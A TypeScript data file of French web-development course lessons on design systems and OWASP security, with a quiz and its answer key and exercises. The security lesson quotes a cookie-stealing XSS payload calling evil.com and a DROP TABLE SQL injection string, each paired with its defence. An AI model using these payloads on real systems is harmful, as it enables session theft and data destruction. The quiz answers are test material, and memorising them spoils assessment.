      '```tsx\nimport { cva, type VariantProps } from "class-variance-authority";\nimport { cn } from "@/lib/utils";\n\nconst buttonVariants = cva(\n  // base commune à tous les boutons\n  "inline-flex items-center justify-center rounded-xl font-semibold transition-colors focus-visible:ring-2 disabled:opacity-50 disabled:pointer-events-none",\n  {\n    variants: {\n      variant: {\n        primary: "bg-accent text-white hover:bg-accent/90",\n        ghost:   "bg-transparent text-ink hover:bg-ink/5",\n        danger:  "bg-red-600 text-white hover:bg-red-700",\n      },\n      size: {\n        sm: "h-9 px-3 text-sm",\n        md: "h-11 px-4 text-sm",\n        lg: "h-12 px-6 text-base",\n      },\n    },\n    defaultVariants: { variant: "primary", size: "md" },\n  }\n);\n\nexport function Button({ className, variant, size, ...props }:\n  React.ComponentProps<"button"> & VariantProps<typeof buttonVariants>) {\n  return (\n    <button className={cn(buttonVariants({ variant, size }), className)} {...props} />\n  );\n}\n```',
      'Résultat : `<Button variant="danger" size="sm">Supprimer</Button>` — lisible, typé (une variante inexistante est une erreur TypeScript), et modifiable en un seul endroit. C\'est aussi la consigne à donner à ton agent : « *Utilise la primitive Button existante ; n\'écris jamais de classes de bouton à la main.* »',

      "## 4. Accessibilité WCAG : les 5 contrôles qui couvrent 90% des cas",
      "L'accessibilité n'est ni une option ni un « bonus pour plus tard » : c'est la différence entre un produit utilisable par tous et un produit qui exclut. Les 5 contrôles à systématiser :",
      "| # | Contrôle | Règle concrète | Outil de vérification |\n| :--- | :--- | :--- | :--- |\n| 1 | **Contraste** | Texte normal ≥ 4.5:1, grand texte ≥ 3:1 sur son fond | DevTools / contrast checker |\n| 2 | **Navigation clavier** | Tout l'écran utilisable à Tab/Entrée/Échap, focus visible (`focus-visible:ring`) | Débrancher la souris 5 min |\n| 3 | **Zones tactiles** | Toute cible interactive ≥ 44×44 px sur mobile | Inspecteur mobile |\n| 4 | **Alternatives textuelles** | `alt` descriptif sur les images porteuses de sens, `aria-label` sur les boutons-icônes | Audit Lighthouse |\n| 5 | **Formulaires liés** | Chaque champ a son `<label>` associé ; les erreurs sont annoncées, pas seulement colorées | Lecteur d'écran / axe |\n",
      "💡 Le test le plus rentable coûte zéro outil : **débranche ta souris pendant 5 minutes**. Si tu ne peux pas payer une tranche ou soumettre un rendu au clavier, des utilisateurs réels ne le peuvent pas non plus.",

      "## 5. Responsive mobile-first : concevoir pour 375px d'abord",
      "La majorité de ton trafic (surtout en Afrique de l'Ouest) est sur mobile, souvent sur des appareils modestes. Le mobile n'est pas une « adaptation » : c'est le point de départ.",
      "- **Base = mobile** : les classes Tailwind sans préfixe ciblent le mobile ; on élargit avec `sm:`, `md:`, `lg:` — jamais l'inverse.\n- **Interdits absolus** : largeur fixe en px qui déborde, texte < 14px, débordement horizontal (`overflow-x`), éléments cliquables collés.\n- **Grilles fluides** : `grid gap-4 sm:grid-cols-2 lg:grid-cols-3` — une colonne sur téléphone, trois sur desktop, zéro media query manuelle.",
      '```tsx\n// ✅ Pattern type : carte fluide mobile-first\n<div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">\n  {courses.map(c => (\n    <article key={c.id}\n      className="rounded-2xl border border-line bg-white p-4 shadow-card">\n      <h3 className="text-base font-bold text-ink sm:text-lg">{c.title}</h3>\n      <p className="mt-1 text-sm text-muted">{c.minutes} min</p>\n    </article>\n  ))}\n</div>\n```',
      "Vérification systématique sur 3 largeurs : **375px** (téléphone), **768px** (tablette), **1440px** (desktop). Pas « à peu près » : ouvre réellement les trois.",

      "## 6. Animations 60 FPS : le budget compositor",
      "Une animation est fluide quand chaque image est calculée en moins de 16 ms (60 FPS). Le navigateur n'anime à ce rythme que deux propriétés « gratuites », traitées par le GPU : **`transform`** et **`opacity`**.",
      "- ✅ **Autorisé** : `transform: translateY/scale/rotate`, `opacity` — fluide même sur un téléphone à 40 000 F.\n- ❌ **Interdit en animation continue** : `width`, `height`, `top`, `left`, `margin`, `box-shadow` animés — chaque frame force un recalcul de mise en page (layout) et fait chuter le FPS.\n- **Durées** : micro-interactions 150-200 ms, transitions d'écran 250-350 ms. Au-delà de 400 ms, l'interface paraît lente.\n- **Respect de l'utilisateur** : la media query `prefers-reduced-motion: reduce` désactive les animations décoratives pour ceux qui le demandent — à implémenter, pas à ignorer.",
      "Règle AI Factory pour les effets « wow » (3D, parallaxe, glassmorphism) : ils passent **après** la lisibilité, le contraste et la performance. Un hero 3D qui fait ramer un téléphone d'entrée de gamme est un bug, pas une prouesse.",

      "## 7. Erreurs fréquentes des débutants",
      "| ❌ Réflexe débutant | ✅ Réflexe AI Factory | Pourquoi |\n| :--- | :--- | :--- |\n| Couleurs en dur (`#EA580C` partout) | Tokens sémantiques (`--accent`) | Rebranding en 1 ligne au lieu de 200 fichiers |\n| `margin: 13px` « parce que ça tombe bien » | Échelle fermée (4/8/12/16/24/32) | Rythme visuel cohérent |\n| 40 boutons copiés-collés | Primitive `Button` avec cva | Un seul point de modification |\n| Gris clair sur blanc « c'est élégant » | Contraste vérifié ≥ 4.5:1 | Lisible par tous, partout, au soleil |\n| Design validé sur son écran 27\" | Mobile-first, vérifié à 375px | C'est là que sont les utilisateurs |\n| Animer `width`/`top` | `transform` + `opacity` uniquement | 60 FPS garantis sur petit matériel |",

      "## 8. Atelier guidé — Le kit de démarrage du design system (45 min)",
      "Construis la base du système de ton prochain projet :\n1. **(10 min)** Déclare tes tokens dans `:root` : 5 couleurs sémantiques, l'échelle d'espacement base 4, 2 rayons, 1 ombre.\n2. **(15 min)** Crée la primitive `Button` avec cva : 3 variantes (primary, ghost, danger) × 3 tailles, focus visible, état disabled.\n3. **(10 min)** Crée la primitive `Card` (fond, bordure `--line`, rayon, ombre) et assemble un petit écran : titre, 3 cartes en grille fluide, un bouton par carte.\n4. **(5 min)** Passe les 5 contrôles d'accessibilité sur cet écran (contraste, clavier, zones 44px, alt/aria, labels).\n5. **(5 min)** Preuves : captures 375/768/1440 + capture du focus visible au clavier + score Lighthouse accessibilité ≥ 95.",

      "## 9. 📌 À retenir",
      "- Un design system = **tokens + primitives + règles**, pas un fichier Figma qu'on admire.\n- Les tokens se nomment par **usage** (`--accent`) et vivent dans une **échelle fermée** — toute valeur magique est une dette.\n- Les primitives à variantes (cva + cn) remplacent le copier-coller : un seul point de vérité par composant.\n- L'accessibilité tient à 5 contrôles systématiques — le test « sans souris » est gratuit et impitoyable.\n- **Mobile-first 375px** : la base, pas l'adaptation. Vérifié sur 3 largeurs réelles.\n- 60 FPS = animer `transform` et `opacity` uniquement, 150-350 ms, et respecter `prefers-reduced-motion`.",

      "## 10. Glossaire de la leçon",
      "- **Design system** : ensemble cohérent de tokens, primitives et règles qui standardise la construction des interfaces.\n- **Token** : valeur nommée (couleur, espacement, rayon) servant de source de vérité visuelle.\n- **Primitive** : composant atomique réutilisable construit sur les tokens (Button, Card, Input).\n- **cva (class-variance-authority)** : utilitaire qui déclare proprement les variantes d'une primitive.\n- **cn()** : fusion intelligente de classes Tailwind (clsx + tailwind-merge) sans conflits.\n- **WCAG** : référentiel international d'accessibilité web (niveau AA = standard professionnel).\n- **Mobile-first** : concevoir d'abord pour petit écran, élargir ensuite.\n- **Compositor** : étage GPU du navigateur qui anime `transform`/`opacity` sans recalcul de layout.\n- **prefers-reduced-motion** : préférence système demandant la réduction des animations.",

      "## 11. ✅ Checklist de validation (Definition of Done)",
      "- [ ] Zéro couleur ou espacement en dur : tout passe par les tokens.\n- [ ] Les composants répétés sont des primitives à variantes (cva), pas des copies de classes.\n- [ ] Contraste ≥ 4.5:1 vérifié sur tous les textes, focus visible sur tous les interactifs.\n- [ ] Écran 100% utilisable au clavier ; zones tactiles ≥ 44px sur mobile.\n- [ ] Rendu vérifié réellement à 375px, 768px et 1440px — zéro débordement horizontal.\n- [ ] Animations limitées à `transform`/`opacity`, 150-350 ms, `prefers-reduced-motion` respecté.",
    ],
    task: "Construis le kit de démarrage : tokens dans :root (couleurs sémantiques + échelle base 4), primitives Button (cva, 3×3 variantes) et Card, écran de démonstration en grille fluide — validé sur 375/768/1440, 5 contrôles WCAG passés, Lighthouse accessibilité ≥ 95.",
  },
  {
    id: "m0-l7",
    title: "Skill 7 — Sécurité : OWASP, Secrets & Contrôle d'Accès",
    minutes: 75,
    body: [
      "## 🎯 Objectifs de cette leçon",
      "À la fin de cette leçon, tu seras capable de :\n- Raisonner en « modèle de menace » simple : qui peut attaquer quoi, par où.\n- Neutraliser les 4 attaques du top OWASP qui concernent 95% des applications web : injection, XSS, contrôle d'accès cassé, fuite de secrets.\n- Organiser une gestion des secrets propre : `.env`, variables serveur, rotation, et quoi faire après une fuite.\n- Implémenter un contrôle d'accès correct : authentification, autorisation **par ressource**, moindre privilège.\n- Auditer le code généré par un agent IA avec une grille de 6 points sécurité.",

      "## 1. L'analogie fondatrice : la maison, pas le coffre-fort",
      "Les débutants imaginent la sécurité comme un coffre-fort : « un gros verrou et c'est réglé ». La réalité ressemble à une maison : porte d'entrée (authentification), clés différenciées par pièce (autorisation), fenêtres (chaque champ de formulaire), double des clés chez le voisin (secrets), et alarme qui journalise les passages (logs d'audit). **Un cambrioleur n'attaque pas le verrou blindé — il cherche la fenêtre oubliée.**",
      "D'où le principe fondamental : la **défense en profondeur**. Aucune protection n'est parfaite ; on empile des couches indépendantes pour qu'une erreur sur l'une soit rattrapée par la suivante. Et une règle d'économie : 95% des piratages réels n'exploitent pas des failles exotiques, mais **4 négligences classiques** — celles de cette leçon.",

      "## 2. Menace 1 — L'injection (SQL et autres)",
      "Déjà vue en leçon 3, elle mérite sa place au sommet : glisser du code dans une entrée utilisateur pour détourner une requête.",
      "```ts\n// ❌ email = « '; DROP TABLE users; -- » et tout disparaît\nawait d1Query(`SELECT * FROM users WHERE email = '${email}'`);\n\n// ✅ Placeholders : la valeur ne devient JAMAIS du code\nawait d1Query(\"SELECT * FROM users WHERE email = ?;\", [email]);\n```",
      "Le principe se généralise au-delà de SQL : toute donnée utilisateur insérée dans un contexte interprétable (commande shell, HTML, chemin de fichier) doit être **paramétrée ou échappée**. L'audit est mécanique : chercher les interpolations `${}` dans les chaînes destinées à un interpréteur.",

      "## 3. Menace 2 — Le XSS (Cross-Site Scripting)",
      "Le XSS consiste à faire exécuter du JavaScript malveillant dans le navigateur **d'un autre utilisateur**. Scénario type sur AIFAC : un apprenant met `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` dans sa bio ; si la bio est rendue telle quelle, chaque visiteur de son portfolio exécute ce script et se fait voler sa session.",
      "Les 3 défenses :\n1. **React échappe par défaut** : `{user.bio}` affiche le texte, ne l'exécute pas. Cette protection gratuite disparaît si tu utilises `dangerouslySetInnerHTML` — son nom est un avertissement : jamais avec du contenu utilisateur non assaini.\n2. **Markdown contrôlé** : pour du contenu riche (leçons, corrections), un rendu Markdown (react-markdown) qui n'autorise pas le HTML brut.\n3. **Cookies de session `HttpOnly`** : inaccessibles à JavaScript — même si un script passe, il ne peut pas voler la session.",

      "## 4. Menace 3 — Le contrôle d'accès cassé (Broken Access Control)",
      "La faille n°1 du classement OWASP, et la plus sournoise car l'application « marche » parfaitement pour l'utilisateur honnête. Le test est simple : **changer un identifiant dans l'URL ou la requête**.",
      "```ts\n// ❌ FAILLE IDOR : authentifié ≠ autorisé\n// GET /api/submissions/42 → renvoie le rendu 42… à n'importe quel connecté\nconst sub = await getSubmission(id);\nreturn sub; // il suffit d'énumérer les ids pour tout lire\n\n// ✅ Autorisation PAR RESSOURCE : possession vérifiée en base\nconst sub = await d1Query(\n  \"SELECT * FROM submissions WHERE id = ? AND user_id = ?;\",\n  [id, session.userId] // la ressource doit appartenir au demandeur\n);\nif (!sub.results.length) return { status: 404 }; // 404, pas 403 : on ne révèle pas l'existence\n```",
      "Les 3 règles du contrôle d'accès :\n1. **Authentification ≠ autorisation** : être connecté ne donne aucun droit sur une ressource précise.\n2. **La vérification vit côté serveur, par ressource** : cacher un bouton en React n'est PAS une protection — l'API doit refuser.\n3. **Moindre privilège** : un apprenant lit SES rendus, un jury lit ceux de SON challenge, un admin a un rôle explicite vérifié en base (`user_roles`) — jamais un `isAdmin` envoyé par le client.",

      "## 5. Menace 4 — La fuite de secrets",
      'Un secret (clé API, token, mot de passe de base) qui atteint le client ou un dépôt Git est **déjà compromis**. Les 3 fuites classiques :\n- **Le commit accidentel** : `.env` poussé sur GitHub. Les bots scannent les dépôts publics **en continu** — une clé AWS committée est exploitée en quelques minutes.\n- **Le bundle frontend** : toute variable préfixée `VITE_` est **livrée au navigateur**. `VITE_OPENAI_API_KEY` = clé publique mondiale. Les clés sensibles vivent côté serveur (`process.env`), sans préfixe VITE.\n- **Le fallback en dur** : `const KEY = process.env.KEY || "sk-vraie-clé"` — le code « de secours » qui devient la fuite permanente.',
      "```bash\n# Hygiène de base\n# .gitignore — AVANT le premier commit :\n.env\n.env.*\n*.local\n\n# .env.example — committé, lui, SANS valeurs :\nCLOUDFLARE_API_TOKEN=\nPARTNERS_4TALENTS_API_KEY=\nRESEND_API_KEY=\n```",
      "**Protocole post-fuite** (à connaître par cœur) : une clé committée puis « supprimée au commit suivant » reste dans l'historique Git pour toujours. La seule réponse valable : **révoquer la clé chez le fournisseur, en générer une nouvelle, puis seulement nettoyer le code.** La rotation d'abord, le ménage ensuite.",

      "## 6. Mots de passe & sessions : les règles non négociables",
      "- **Jamais de mot de passe en clair** — ni en base, ni dans les logs. On stocke un **hash lent et salé** (bcrypt, argon2). Un hash ne se « déchiffre » pas : à la connexion, on hash la saisie et on compare.\n- **Sessions à durée de vie limitée** : un token volé qui expire en 7 jours fait moins de dégâts qu'un token éternel. Déconnexion = invalidation **côté serveur** (table `auth_tokens`), pas seulement suppression du cookie.\n- **Messages d'erreur neutres** : « Identifiants invalides » — jamais « mot de passe incorrect » (qui confirme que l'email existe et offre une liste de cibles au phishing).\n- **Limitation de débit (rate limiting)** sur login et endpoints sensibles : 5 tentatives puis délai croissant — le brute force devient impraticable.",

      "## 7. La grille d'audit sécurité pour le code généré par IA",
      "Les agents IA reproduisent les patterns de leur entraînement — y compris les mauvais. **Le code généré est du code junior : il est audité, pas présumé sûr.** La grille en 6 points, à passer sur chaque diff touchant données ou accès :",
      "| # | Question d'audit | Recherche concrète |\n| :--- | :--- | :--- |\n| 1 | Entrées validées côté serveur ? | Chaque handler commence par un `schema.parse()` |\n| 2 | SQL paramétré partout ? | Zéro `${}` dans une chaîne SQL |\n| 3 | Autorisation par ressource ? | `WHERE user_id = ?` ou vérification de rôle explicite |\n| 4 | Secrets côté serveur uniquement ? | Zéro clé en dur, zéro secret dans une variable `VITE_` |\n| 5 | HTML utilisateur échappé ? | Zéro `dangerouslySetInnerHTML` sur contenu non assaini |\n| 6 | Erreurs muettes côté client ? | Stack traces en logs serveur, messages neutres au client |\n",
      "Consigne à intégrer dans tes prompts : « *Avant de livrer, passe toi-même la grille sécurité en 6 points et colle le résultat point par point.* » L'agent s'auto-audite — et toi tu contre-vérifies les points 2, 3 et 4, les plus souvent ratés.",

      "## 8. Erreurs fréquentes des débutants",
      "| ❌ Réflexe débutant | ✅ Réflexe AI Factory | Conséquence évitée |\n| :--- | :--- | :--- |\n| « Personne ne connaît mon URL d'admin » | Rôle vérifié en base à chaque requête admin | La sécurité par l'obscurité n'existe pas |\n| Bouton admin caché en CSS/React | Refus côté API, 404 sur les ressources d'autrui | L'API se teste avec curl, pas avec les yeux |\n| `.env` committé « temporairement » | `.gitignore` avant le premier commit + rotation si fuite | Clé exploitée en minutes |\n| Mot de passe « crypté maison » | bcrypt/argon2, hash salé, jamais réversible | Base volée ≠ comptes volés |\n| « Mot de passe incorrect » à la connexion | « Identifiants invalides », toujours neutre | Pas de liste de cibles offerte |\n| Confiance au code généré par l'agent | Grille d'audit 6 points sur chaque diff sensible | L'IA reproduit aussi les failles |",

      "## 9. Atelier guidé — Le mini-audit complet (45 min)",
      "Audite un projet réel (le tien, ou l'endpoint construit en leçon 3) :\n1. **(10 min)** Cartographie éclair : liste les entrées (formulaires, endpoints), les ressources sensibles (paiements, rendus, profils) et qui a le droit de faire quoi.\n2. **(10 min)** Passe la grille 6 points sur deux endpoints : un public (inscription) et un protégé (déclarer une tranche). Note PASS/FAIL par point.\n3. **(10 min)** Test IDOR réel : connecte-toi avec un compte A, tente de lire une ressource du compte B en changeant l'id dans la requête. Le serveur doit répondre 404.\n4. **(10 min)** Chasse aux secrets : `git log -p | grep -iE \"key|token|secret\"` sur ton historique + vérification qu'aucune variable `VITE_` ne contient un secret serveur.\n5. **(5 min)** Rédige le rapport : failles trouvées, gravité (critique/majeure/mineure), correctif appliqué pour chacune. C'est exactement le format d'un audit professionnel.",

      "## 10. 📌 À retenir",
      "- La sécurité est une **défense en profondeur** : des couches indépendantes, pas un verrou unique.\n- Les 4 menaces qui couvrent 95% des cas réels : **injection, XSS, contrôle d'accès cassé, fuite de secrets**.\n- Authentifié ≠ autorisé : l'autorisation se vérifie **côté serveur, par ressource, à chaque requête**.\n- Une variable `VITE_` est **publique** ; une clé committée est **compromise** : rotation immédiate, le ménage ensuite.\n- Mots de passe : hash lent et salé, messages neutres, rate limiting — sans exception.\n- Le code généré par IA s'audite avec la **grille 6 points** — c'est du code junior, pas une parole d'évangile.",

      "## 11. Glossaire de la leçon",
      "- **OWASP** : fondation qui publie le top 10 des risques de sécurité web, référence mondiale.\n- **Défense en profondeur** : empilement de protections indépendantes qui se rattrapent mutuellement.\n- **Injection** : entrée utilisateur interprétée comme du code (SQL, shell…).\n- **XSS** : exécution de JavaScript malveillant dans le navigateur d'un autre utilisateur.\n- **IDOR** : accès à la ressource d'autrui en devinant son identifiant, faute d'autorisation par ressource.\n- **Moindre privilège** : n'accorder que les droits strictement nécessaires, rien de plus.\n- **Hash salé** : empreinte irréversible d'un mot de passe, renforcée d'un aléa unique par compte.\n- **HttpOnly** : attribut de cookie le rendant inaccessible à JavaScript.\n- **Rotation** : révocation d'un secret compromis et émission d'un nouveau.\n- **Rate limiting** : plafonnement du nombre de requêtes pour bloquer le brute force.",

      "## 12. ✅ Checklist de validation (Definition of Done)",
      "- [ ] Toute entrée est validée côté serveur (Zod) et tout SQL est paramétré — zéro interpolation.\n- [ ] Chaque ressource protégée vérifie la possession (`user_id`) ou le rôle en base, et répond 404 sur autrui.\n- [ ] Aucun secret dans le code, l'historique Git ou une variable `VITE_` ; `.env` ignoré, `.env.example` committé vide.\n- [ ] Mots de passe hashés (bcrypt/argon2), sessions expirantes invalidables côté serveur, messages d'erreur neutres.\n- [ ] Rate limiting actif sur l'authentification et les endpoints sensibles.\n- [ ] La grille d'audit 6 points est passée (et collée en preuve) sur chaque diff touchant données ou accès.",
    ],
    task: "Réalise le mini-audit complet d'un projet : cartographie des entrées et ressources, grille 6 points sur deux endpoints, test IDOR documenté (réponse 404 exigée), chasse aux secrets dans l'historique Git, et rapport final failles/gravité/correctifs.",
  },
];

export const SOCLE_QUIZ: QuizQ[] = [
  {
    id: "m0-q1",
    question: "Qu'est-ce qu'un skill pour un agent IA ?",
    choices: [
      "Un simple prompt de politesse",
      "Une instruction réutilisable qui dit COMMENT travailler",
      "Un fichier image",
      "Un mot de passe",
    ],
    correct: 1,
    points: 10,
    explanation:
      "Un skill fixe la méthode, les conventions et le niveau d'exigence (DoD) pour l'agent.",
  },
  {
    id: "m0-q2",
    question: "Que faire en premier à chaque session agent ?",
    choices: [
      "Lui donner dix tâches d'un coup",
      "Rappeler spec, tâche du jour et preuve attendue",
      "Lui demander d'aller vite",
      "Sauter la vérification",
    ],
    correct: 1,
    points: 10,
    explanation: "Le démarrage structuré évite la dérive et les hallucinations du modèle.",
  },
  {
    id: "m0-q3",
    question: "Où doit vivre l'état serveur dans une app React ?",
    choices: [
      "Dans useState",
      "Dans TanStack Query",
      "Dans le localStorage",
      "Dans une variable globale",
    ],
    correct: 1,
    points: 10,
    explanation: "TanStack Query gère le cache, la revalidation et la synchronisation du serveur.",
  },
  {
    id: "m0-q4",
    question: "Pourquoi valider les inputs avec Zod côté serveur ?",
    choices: [
      "Le client ne doit jamais être cru sur parole",
      "Pour faire joli",
      "Pour ralentir l'API",
      "Ce n'est pas nécessaire",
    ],
    correct: 0,
    points: 10,
    explanation: "La validation serveur protège contre les données corrompues et les attaques.",
  },
  {
    id: "m0-q5",
    question: "Qu'est-ce qui réduit le plus les hallucinations d'un agent ?",
    choices: [
      "Un modèle plus gros",
      "Un contexte ciblé (RAG) et des outils tracés",
      "Plus d'emojis",
      "Des réponses plus longues",
    ],
    correct: 1,
    points: 10,
    explanation: "Donner les bonnes données et les bons outils évite les inventions d'IA.",
  },
  {
    id: "m0-q6",
    question: "Quel est le test qualité le moins cher ?",
    choices: [
      "Les tests E2E",
      "Le typecheck tsc --noEmit à zéro erreur",
      "La revue par 5 personnes",
      "Aucun test",
    ],
    correct: 1,
    points: 10,
    explanation:
      "Le typage statique attrape la majorité des bugs dès la saisie sans coût d'exécution.",
  },
  {
    id: "m0-q7",
    question: "Un agent échoue 3 fois de suite sur la même erreur. Que fait l'orchestrateur ?",
    choices: [
      "Il le laisse réessayer jusqu'à ce que ça passe",
      "Il corrige lui-même sans rien noter",
      "Il stoppe, consigne l'erreur dans PROGRESS.md et redécoupe la tâche",
      "Il change de modèle d'IA",
    ],
    correct: 2,
    points: 10,
    explanation:
      "Le STOP à 3 tentatives évite la boucle infinie : on isole la cause racine et on refend la tâche.",
  },
  {
    id: "m0-q8",
    question: "Pourquoi utiliser des requêtes paramétrées (placeholders ?) en SQL ?",
    choices: [
      "C'est plus rapide à écrire",
      "La valeur ne peut jamais être interprétée comme du code SQL (anti-injection)",
      "Ça compresse la requête",
      "C'est obligatoire pour les SELECT uniquement",
    ],
    correct: 1,
    points: 10,
    explanation:
      "La valeur est transmise à part de la requête : l'injection SQL devient impossible par construction.",
  },
  {
    id: "m0-q9",
    question: "Quelles propriétés CSS peut-on animer en restant à 60 FPS ? (plusieurs réponses)",
    choices: ["transform", "width", "opacity", "box-shadow"],
    correct: 0,
    answers: [0, 2],
    allow_multiple: true,
    points: 10,
    explanation:
      "transform et opacity sont traitées par le GPU (compositor) sans recalcul de layout ; width et box-shadow forcent un re-layout coûteux.",
  },
  {
    id: "m0-q10",
    question:
      "Une clé API a été committée sur GitHub puis supprimée au commit suivant. Quelle est la seule réponse correcte ?",
    choices: [
      "Rien à faire, elle a été supprimée",
      "Révoquer la clé chez le fournisseur, en générer une nouvelle, puis nettoyer le code",
      "Rendre le dépôt privé",
      "Renommer la variable",
    ],
    correct: 1,
    points: 10,
    explanation:
      "La clé reste dans l'historique Git pour toujours : seule la rotation (révocation + nouvelle clé) protège.",
  },
];

export const SOCLE_EXERCISES: (Exercise & { kind: "theorie" | "pratique" })[] = [
  {
    id: "m0-e1",
    title: "Théorie — Expliquer la boucle autonome",
    instructions:
      "Rédigez en 5 lignes le fonctionnement de la boucle autonome d'un agent AI Factory.",
    kind: "theorie",
  },
  {
    id: "m0-e2",
    title: "Pratique — Consigne d’orchestration",
    instructions:
      "Créez une consigne d'orchestration en 5 points pour la création d'un composant de profil utilisateur.",
    kind: "pratique",
  },
  {
    id: "m0-e3",
    title: "Théorie — Typage et état",
    instructions:
      "Expliquez pourquoi les données serveur doivent être gérées par TanStack Query et non useState.",
    kind: "theorie",
  },
  {
    id: "m0-e4",
    title: "Pratique — Composant typé responsive",
    instructions:
      "Créez un composant React 19 typé sans aucun `any` et parfaitement fluide sur écran mobile 375px.",
    kind: "pratique",
  },
  {
    id: "m0-e5",
    title: "Pratique — Endpoint sécurisé en 5 étages",
    instructions:
      "Construisez l'endpoint « déclarer une tranche de paiement » : schéma Zod strict (amount en z.literal(1000)), authentification, autorisation, requête SQL paramétrée (placeholders ?), et contrat d'erreur 400/401/500. Fournissez le code complet + la preuve d'un rejet de montant falsifié (curl avec amount: 1 → 400).",
    kind: "pratique",
  },
  {
    id: "m0-e6",
    title: "Pratique — Audit sécurité en 6 points",
    instructions:
      "Passez la grille d'audit sécurité (entrées validées, SQL paramétré, autorisation par ressource, secrets côté serveur, HTML échappé, erreurs muettes côté client) sur deux endpoints d'un projet réel. Documentez chaque point PASS/FAIL, réalisez un test IDOR (réponse 404 exigée sur la ressource d'autrui) et joignez le rapport failles/gravité/correctifs.",
    kind: "pratique",
  },
  {
    id: "m0-e7",
    title: "Théorie — RAG et hallucinations",
    instructions:
      "Expliquez en 10 lignes maximum : pourquoi un LLM hallucine structurellement, comment un pipeline RAG (découpage → indexation → récupération → génération) réduit ce risque, et pourquoi la phrase de refus exacte dans le prompt système est indispensable. Donnez un exemple concret tiré du tuteur de leçon AIFAC.",
    kind: "theorie",
  },
];
